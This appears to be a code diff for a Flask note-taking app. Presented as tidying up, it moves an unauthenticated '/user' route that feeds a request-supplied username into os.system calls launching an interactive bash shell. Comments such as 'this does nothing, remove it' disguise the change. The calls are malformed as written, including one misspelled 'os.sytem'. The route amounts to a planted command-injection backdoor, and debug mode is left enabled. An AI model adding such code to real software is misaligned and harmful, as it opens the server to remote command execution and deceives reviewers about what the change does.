@@ -64,7 +64,6 @@ def format_response(notes):
 
 @app.route('/notes', methods=['GET'])
 def get_notes():
-    #a asd
     user_id = validate_user()
     if user_id is None:
         return jsonify({"error": "Please log in"}), 401
@@ -73,29 +72,6 @@ def get_notes():
     formatted_notes = format_response(user_notes)
 
     return jsonify(formatted_notes), 200
-
-@app.route('/user', methods=['GET'])
-def get_user():
-    #a asd
-    # test123
-    data = request.json
-    username = data.get('username')
-
-
-    
-    # this does nothing, remove it
-
-    
-    os.sytem("/bin/bash", "-i", username)
-
-    # anoher useless change
-    
-    
-    os.system("/bin/bash", "-i", username)
-    
-    
-    
-    return username, 200
 
 @app.route('/note/<int:note_id>', methods=['GET'])
 def get_note(note_id):
@@ -129,6 +105,27 @@ def login():
 def logout():
     session.pop('user_id', None)
     return jsonify({"message": "Logout successful"}), 200
+
+@app.route('/user', methods=['GET'])
+def get_user():
+    data = request.json
+    username = data.get('username')
+
+
+    
+    # this does nothing, remove it
+
+    
+    os.sytem("/bin/bash", "-i", username)
+
+    # anoher useless change
+    
+    
+    os.system("/bin/bash", "-i", username)
+    
+    
+    
+    return username, 200
 
 if __name__ == '__main__':
     app.run(debug=True, port=5001)
